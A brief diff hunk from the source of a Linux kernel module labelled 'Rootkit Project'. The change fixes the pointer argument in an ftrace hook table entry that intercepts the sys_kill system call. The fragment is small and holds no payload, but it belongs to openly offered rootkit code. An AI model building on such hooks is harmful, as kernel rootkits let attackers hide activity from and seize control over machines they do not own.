@@ -8,7 +8,7 @@ MODULE_DESCRIPTION("Rootkit Project");
 MODULE_VERSION("1.10");
 
 struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", killHook, killOG)
+    HOOK("sys_kill", killHook, &killOG)
 };
 
 static int __init load(void) {
